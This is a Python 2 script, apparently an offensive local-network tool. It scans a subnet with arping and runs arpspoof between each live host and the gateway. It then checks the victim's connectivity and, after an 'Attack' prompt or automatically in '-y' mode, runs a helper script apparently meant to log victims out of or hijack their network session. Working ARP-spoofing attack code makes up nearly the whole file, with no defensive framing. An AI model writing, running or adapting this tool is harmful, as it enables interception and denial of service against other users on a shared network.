import sys,os,urllib,time,socket,threading
print "Importing scapy..."
import scapy.all as scapy
from getopt import getopt
#import scapy_http.http
socket.setdefaulttimeout(3)
DEVNULL = "/dev/null"
Limit = 23333333
if len(sys.argv) < 2 or 1:
    print "Executing sudo......"
    os.system("ip addr show")
    interface = raw_input("The interface:")
    last_ip = ""
    try:
        ipmask = os.popen("ip addr show|grep \"inet \"|grep %s|xargs|awk -F '[ :]' '{print $2}'" %(interface)).read()
        last_ip = ipmask[0:ipmask.find("/")]
        mask = int(ipmask[ipmask.find("/")+1 :])
        print "The last IP is %s,netmask %d," %(last_ip,mask)
    except Exception,e:
        print "Auto Configuation ERROR:%s" %(str(e),)
        print "Raw String:" + ipmask
        mask = int(raw_input("The Netmask:"))
        last_ip = raw_input("The last ip you get:")

    Start = int(raw_input("Start:"))
    End = int(raw_input("End:")) + 1
    Gateway = raw_input("Gateway:")
    
    if "-y" in sys.argv:
        Limit = int(raw_input("Count:"))
    raw_input("Press enter to continue......")

ip_o = last_ip
(sp1,sp2,sp3,sp4) = last_ip.split(".")

iplist = []
Break = False
r = False
arpLists = []

class LastIP:
    pass

stars = lambda x:"*" * x

def verify(ip):
    #Need to fall back to original IP
    if ip_o == ip : return False
    else:
        ret = os.system("arping -I %s -c 1 -f %s" %(interface,ip))
        print ret
        #ret = os.system(" ping -c 2 %s" %(ip,))
        # ret == 2: SIGINT
        if ret == 2: raise KeyboardInterrupt
        if (ret == 0) : return False
        else: return True

       
def mainLoop():
    global Limit
    #Mainloop
    for p3 in range(Start,End):
        for p4 in range(1,256):
            ip_now = "%s.%s.%d.%d" %(sp1,sp2,p3,p4)
            try:
                r = verify(ip_now)
            except KeyboardInterrupt:
                raise

            if not Limit:return 0
            #Lock
            
            #print urllib.urlopen("http://1.1.1.2/ajaxlogout?_t=23333").read()
            try:
                last = time.time()
                if (r): raise
                os.system("arpspoof -c own -i %s -t %s %s -r >/dev/null 2>&1 &" %(interface, ip_now, Gateway))
                #use HTTP server of sina.cn
                result = os.popen("python network_test.py %s %s" %(interface, str(ip_now))).read()
                now = time.time()
            except Exception,e:
                if (r):
                    print ip_now + " is offline."
                else:
                    print ip_now + " met " + str(e) + "."
            else:
                #Get 501 if not blocked
                if (result.find("Target network reachable.") != -1):
                    #r = verify(ip_now)
                    last_ip = ip_o
                    ip_t = ip_now
                    #if not r: iplist.append(ip_now)
                    print "%s is OK,elapsed %.4fs,status %s." %(ip_now,now-last,str(r))

                    if not r:
                        print stars(20)
                        
                        if "-y" in sys.argv:
                            Confirm = "y"
                        else:
                            Confirm = raw_input("Target %s Locked,waiting...\nAttack(y/N/e/L)?" %(ip_t,))
                        
                        if Limit == 0:
                            Confirm = 'e'
                            
                        if Confirm == 'e' : return 0
                        if Confirm == 'L' :
                            Confirm = "y"
                            Limit = 0
                        if Confirm == "Y" or Confirm == "y":
                            pass
                        else:
                            continue
                        
                        try:
                            os.system("python logout_test.py %s %s %s" %(interface ,ip_t ,Gateway) )
                            if "-y" in sys.argv and Limit:
                                Limit -= 1
                        except Exception,e:
                            print str(e)
                        
                else:
                    print ip_now + " was blocked."
                    os.system("pkill -ef %s" %(ip_now,) )
            finally:
                pass

if __name__ == "__main__":
    try:
        mainLoop()
        print "Done Mainloop."
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        print "Fallback."
    finally:
        os.system("killall arpspoof")
    print "Big news!"
